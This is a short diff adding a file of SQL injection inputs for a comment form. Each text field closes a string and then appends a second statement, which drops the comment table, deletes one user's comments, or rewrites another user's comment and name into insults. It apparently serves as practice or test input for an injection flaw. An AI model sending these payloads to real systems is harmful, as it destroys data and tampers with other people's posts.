@@ -1,0 +1,15 @@
+Name: valami
+Text: valami');drop table comment;--
+
+Name: sanyi
+Text: valami');delete from comment where name = 'Paul';--
+
+Name: szilvi
+Text: valami');UPDATE comment
+               SET text = 'I am so stupid.'
+               WHERE name = 'Joe';--
+
+Name: Bob
+Text: valami');UPDATE comment
+                     SET name = 'Joe_hülye'
+                     WHERE name = 'Joe';--
